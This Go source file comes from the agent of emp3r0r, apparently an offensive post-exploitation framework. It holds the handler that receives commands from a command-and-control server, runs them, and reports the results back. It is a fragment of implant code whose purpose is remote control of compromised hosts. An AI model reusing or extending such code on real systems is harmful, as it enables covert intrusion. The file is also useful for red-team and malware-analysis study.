package agent

import (
	"fmt"
	"log"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/spf13/cobra"
)

// exec cmd from C2 server
func handleC2Command(cmdData *def.MsgTunData) {
	cmd_id := cmdData.CmdID
	cmd_argc := len(cmdData.CmdSlice)
	cmdSlice := append(cmdData.CmdSlice, []string{"--cmd_id", cmd_id}...)
	if cmd_argc < 0 {
		log.Printf("Invalid command: %v", cmdSlice)
	}
	log.Printf("Received command: %v", cmdSlice)
	command := CoreCommands()
	is_builtin := strings.HasPrefix(cmdSlice[0], "!")
	if is_builtin {
		command = C2Commands()
	}
	command.SetArgs(cmdSlice)
	command.SetOutput(log.Writer())
	err := command.Execute()
	if err != nil {
		C2RespPrintf(command, "Error: %v", err)
	}
}

func C2RespPrintf(cmd *cobra.Command, format string, args ...interface{}) {
	msg := def.MsgTunData{
		Tag: RuntimeConfig.AgentTag,
	}
	cmd_id, _ := cmd.Flags().GetString("cmd_id")
	cmdSlice := []string{cmd.Name()}
	msg.CmdID = cmd_id
	msg.CmdSlice = cmdSlice
	msg.Response = fmt.Sprintf(format, args...)
	if err := Send2CC(&msg); err != nil {
		log.Println(err)
	}
	log.Printf("Response sent: %s", msg.Response)
}
